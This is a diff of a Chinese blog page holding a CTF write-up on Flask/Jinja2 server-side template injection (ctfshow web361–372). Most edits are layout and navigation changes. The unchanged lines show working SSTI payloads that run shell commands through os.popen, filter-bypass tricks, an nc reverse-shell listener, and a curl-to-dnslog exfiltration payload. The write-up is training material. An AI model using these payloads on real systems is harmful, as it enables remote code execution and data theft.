@@ -14,9 +14,8 @@
 <meta property="og:description" content="数字绕过、request绕过、字符串拼接、chr绕过、反弹绕过、dnslog外带、读文件盲注">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-09-11T12:10:33.000Z">
-<meta property="article:modified_time" content="2022-09-11T14:42:24.816Z">
+<meta property="article:modified_time" content="2023-12-24T05:47:47.060Z">
 <meta property="article:author" content="killeveee">
-<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
     
     
@@ -70,13 +69,11 @@
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      -->
       </ul>
     </span>
@@ -117,7 +114,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web361"><span class="toc-number">2.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web362"><span class="toc-number">3.</span> <span class="toc-text">web362</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web363"><span class="toc-number">4.</span> <span class="toc-text">web363</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web364"><span class="toc-number">5.</span> <span class="toc-text">web364</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web365"><span class="toc-number">6.</span> <span class="toc-text">web365</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web366"><span class="toc-number">7.</span> <span class="toc-text">web366</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web367"><span class="toc-number">8.</span> <span class="toc-text">web367</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web368"><span class="toc-number">9.</span> <span class="toc-text">web368</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web369"><span class="toc-number">10.</span> <span class="toc-text">web369</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web370"><span class="toc-number">11.</span> <span class="toc-text">web370</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web371"><span class="toc-number">12.</span> <span class="toc-text">web371</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web372"><span class="toc-number">13.</span> <span class="toc-text">web372</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web362</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web363</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web364</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web365</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web366</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web367</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web368</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web369</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">11.</span> <span class="toc-text">web370</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">12.</span> <span class="toc-text">web371</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">13.</span> <span class="toc-text">web372</span></a></li></ol>
       </div>
     
   </span>
@@ -155,11 +152,6 @@
 
 
       
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
 
     </div>
   </header>
@@ -180,7 +172,7 @@
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113866139">CTFshow-WEB入门-SSTI_bfengj的博客-CSDN博客_ctfshow web入门ssti</a></li>
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/112168039">CTFSHOW SSTI篇_yu22x的博客-CSDN博客_ctfshow ssti</a></li>
 </ul>
-<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><pre class="line-numbers language-none"><code class="language-none">__class__            返回该对象所属的类。py万物皆对象，比如某个字符串对象，而其所属的类为&lt;class &#39;str&#39;&gt;
+<h1><span id="前置知识">前置知识</span></h1><pre class="line-numbers language-none"><code class="language-none">__class__            返回该对象所属的类。py万物皆对象，比如某个字符串对象，而其所属的类为&lt;class &#39;str&#39;&gt;
 __base__             以字符串形式返回一个类的父类
 __bases__            以元组形式返回一个类的全部父类
 __mro__              返回解析方法调用的顺序，即返回所有父类
@@ -213,7 +205,7 @@ g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ss
 
 
 
-<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p>没有过滤。</p>
+<h1><span id="web361">web361</span></h1><p>没有过滤。</p>
 <p>传入<code>?name=&#123;&#123;10*10&#125;&#125;</code>，回显100。</p>
 <p>这里利用 <em>os._wrap_close</em> 类，写个脚本来找。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
@@ -236,7 +228,7 @@ g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ss
 
 
 
-<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><p>过滤了<strong>数字</strong>。</p>
+<h1><span id="web362">web362</span></h1><p>过滤了<strong>数字</strong>。</p>
 <p>可以<strong>全角数字代替正常数字</strong>，下面是转换代码</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">half2full</span><span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>  
     full <span class="token operator">=</span> <span class="token string">''</span>  
@@ -273,7 +265,7 @@ s<span class="token operator">=</span><span class="token string">"0123456789"</s
 
 
 
-<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><p>过滤了<strong>单双引号</strong>。</p>
+<h1><span id="web363">web363</span></h1><p>过滤了<strong>单双引号</strong>。</p>
 <p>1、这里payload用的是<strong>request</strong>，request.args.a的值由GET传参a的值得到，从而实现绕过。其实也就相当于命令执行里面的拼接。</p>
 <pre class="line-numbers language-none"><code class="language-none">?a&#x3D;os&amp;b&#x3D;popen&amp;c&#x3D;cat &#x2F;flag&amp;name&#x3D;&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -291,7 +283,7 @@ s<span class="token operator">=</span><span class="token string">"0123456789"</s
 
 
 
-<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><p>过滤了<strong>引号和args</strong>。</p>
+<h1><span id="web364">web364</span></h1><p>过滤了<strong>引号和args</strong>。</p>
 <p>1、可以用<strong>chr()函数绕过</strong>。</p>
 <p>首先fuzz一下chr()函数在哪：</p>
 <p>payload：</p>
@@ -320,7 +312,7 @@ Cookie:a&#x3D;os;b&#x3D;popen;c&#x3D;cat &#x2F;flag<span aria-hidden="true" clas
 
 
 
-<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><p>过滤了单双引号，还有中括号。request.cookies仍然可以用</p>
+<h1><span id="web365">web365</span></h1><p>过滤了单双引号，还有中括号。request.cookies仍然可以用</p>
 <p>单双引号的绕过还是利用之前提到的姿势，至于中括号的绕过，拿点绕过，拿<code>__getitem__</code>等绕过都可以。</p>
 <p>使用request绕过的话可以这样：</p>
 <pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;&#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125;&#125;
@@ -329,7 +321,7 @@ Cookie:c&#x3D;cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><
 
 
 
-<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><p>过滤了下划线</p>
+<h1><span id="web366">web366</span></h1><p>过滤了下划线</p>
 <p>根据前置知识我们知道<code>lipsum.__globals__</code>含有os模块</p>
 <pre class="line-numbers language-none"><code class="language-none">本来的payload：&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -351,20 +343,20 @@ Cookie:a&#x3D;__globals__;b&#x3D;cat &#x2F;flag<span aria-hidden="true" class="l
 
 
 
-<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><p>过滤了os</p>
+<h1><span id="web367">web367</span></h1><p>过滤了os</p>
 <p>那就把os写到request里面就行了，只要不ban掉request的话，还是比较轻松的。</p>
 <pre class="line-numbers language-none"><code class="language-none">?a&#x3D;__globals__&amp;b&#x3D;os&amp;c&#x3D;cat &#x2F;flag&amp;name&#x3D;&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><p>过滤了大括号<code>&#123;&#123;&#125;&#125;</code>。</p>
+<h1><span id="web368">web368</span></h1><p>过滤了大括号<code>&#123;&#123;&#125;&#125;</code>。</p>
 <p>使用<code>&#123;%%&#125;</code>绕过,再借助<code>print()</code>回显</p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">?a&#x3D;__globals__&amp;b&#x3D;os&amp;c&#x3D;cat &#x2F;flag&amp;name&#x3D;&#123;% print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><p>过滤了request</p>
+<h1><span id="web369">web369</span></h1><p>过滤了request</p>
 <p>1、<strong>变量重命名</strong>，这里直接用羽师傅的payload:</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?name<span class="token operator">=</span>
 <span class="token punctuation">&#123;</span>% <span class="token builtin class-name">set</span> <span class="token assign-left variable">po</span><span class="token operator">=</span>dict<span class="token punctuation">(</span>po<span class="token operator">=</span>a,p<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join%<span class="token punctuation">&#125;</span>
@@ -476,7 +468,7 @@ flag<span class="token operator">=</span><span class="token string">''</span>
 
 
 
-<h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><p>过滤了数字</p>
+<h1><span id="web370">web370</span></h1><p>过滤了数字</p>
 <p>1、<strong>全角数字绕过</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">把payload里的数字换成对应的全角数字：
 &#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;
@@ -583,7 +575,7 @@ abc
 
 <p>监听 <code>nc -lvp 4567</code> 等待反弹flag。</p>
 <p>直接py发送我没成功，把输出的payload手动发送就行了。</p>
-<h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><p>过滤了print</p>
+<h1><span id="web371">web371</span></h1><p>过滤了print</p>
 <p>1、使用web370的<strong>反弹</strong>脚本。</p>
 <p>2、<strong>dnslog外带</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">?name&#x3D;
@@ -610,7 +602,7 @@ dnslogyyds
 <pre class="line-numbers language-none"><code class="language-none">&#123;%set i&#x3D;(dict(curl&#x3D;aa)|join,f,p,dict(cat&#x3D;a)|join,f,g,dict(flag&#x3D;aa)|join,p,q,dict(tpqdwr&#x3D;a)|join,q,dict(dnslog&#x3D;a)|join,q,dict(cn&#x3D;a)|join)|join%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>里的tpqdwr，改成网站生成的域名即可。</p>
-<h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><p>过滤了count，可以用length替换</p>
+<h1><span id="web372">web372</span></h1><p>过滤了count，可以用length替换</p>
 <pre class="line-numbers language-none"><code class="language-none">?name&#x3D;
 &#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;
 &#123;%set j&#x3D;dict(eeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;
@@ -646,13 +638,11 @@ dnslogyyds
         
           <li><a href="/">首页</a></li>
         
-          <li><a href="/about/">关于</a></li>
-        
           <li><a href="/archives/">归档</a></li>
         
           <li><a href="/categories/">分类</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/about/">关于</a></li>
         
       </ul>
     </div>
@@ -660,7 +650,7 @@ dnslogyyds
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web361"><span class="toc-number">2.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web362"><span class="toc-number">3.</span> <span class="toc-text">web362</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web363"><span class="toc-number">4.</span> <span class="toc-text">web363</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web364"><span class="toc-number">5.</span> <span class="toc-text">web364</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web365"><span class="toc-number">6.</span> <span class="toc-text">web365</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web366"><span class="toc-number">7.</span> <span class="toc-text">web366</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web367"><span class="toc-number">8.</span> <span class="toc-text">web367</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web368"><span class="toc-number">9.</span> <span class="toc-text">web368</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web369"><span class="toc-number">10.</span> <span class="toc-text">web369</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web370"><span class="toc-number">11.</span> <span class="toc-text">web370</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web371"><span class="toc-number">12.</span> <span class="toc-text">web371</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web372"><span class="toc-number">13.</span> <span class="toc-text">web372</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web362</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web363</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web364</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web365</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web366</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web367</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web368</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web369</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">11.</span> <span class="toc-text">web370</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">12.</span> <span class="toc-text">web371</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">13.</span> <span class="toc-text">web372</span></a></li></ol>
       </div>
     
 
@@ -708,13 +698,11 @@ dnslogyyds
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      -->
       </ul>
     </nav>
